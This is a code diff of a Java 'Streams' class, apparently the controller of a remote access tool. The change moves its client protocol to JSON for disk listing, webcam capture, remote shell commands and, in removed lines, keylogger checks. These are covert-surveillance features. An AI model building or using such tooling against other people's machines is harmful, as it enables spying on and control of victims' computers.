@@ -10,6 +10,7 @@ import GUI.TableUtils.SystemState.State;
 import Information.*;
 
 import Information.Action;
+import com.formdev.flatlaf.json.Json;
 import org.json.JSONObject;
 
 
@@ -163,7 +164,9 @@ public class Streams {
                 return listOfDisks.toArray(new String[0]);
             }
             case REQUEST_WEBCAM -> {
-                sendSize(16);
+                object.put("action", 16);
+                System.out.println("sended");
+                mainStream.sendString(object.toString());
                 return readList();
             }
 
@@ -213,9 +216,11 @@ public class Streams {
     }
 
     public String sendAndReadAction(Shell action, String command) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         if (action == Shell.COMMAND) {
-            mainStream.sendSize(11);
-            sendString(command);
+            jsonObject.put("action", 11);
+            jsonObject.put("command", command);
+            mainStream.sendString(jsonObject.toString());
             return readString();
         }
         return null;
@@ -239,11 +244,13 @@ public class Streams {
     }
 
     public Object sendAndReadAction(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         if (action == Action.START_WEBCAM) {
-            sendSize(17);
-            sendString(selectedDevice);
-            sendSize(fragmented ? 1 : 0);
-            sendSize(fps);
+            jsonObject.put("action", 17);
+            jsonObject.put("selected_device", selectedDevice);
+            jsonObject.put("is_fragmented", fragmented);
+            jsonObject.put("fps", fps);
+            mainStream.sendString(jsonObject.toString());
             return new int[]{readSize(), readSize()};
         }
         return null;
@@ -307,20 +314,6 @@ public class Streams {
             receiveFile(nameOfSession);
             sendSize(0);
         }
-    }
-
-    public boolean sendAndReadAction(KeyloggerEvents event) throws IOException {
-        switch (event) {
-            case CHECK_LAST -> {
-                sendSize(1403);
-                return (readSize() != 0);
-            }
-            case CHECK_ALL -> {
-                sendSize(1404);
-                return (readSize()!=0);
-            }
-        }
-        return false;
     }
 
     public int sendAndReadAction(Permissions permissions) throws IOException {
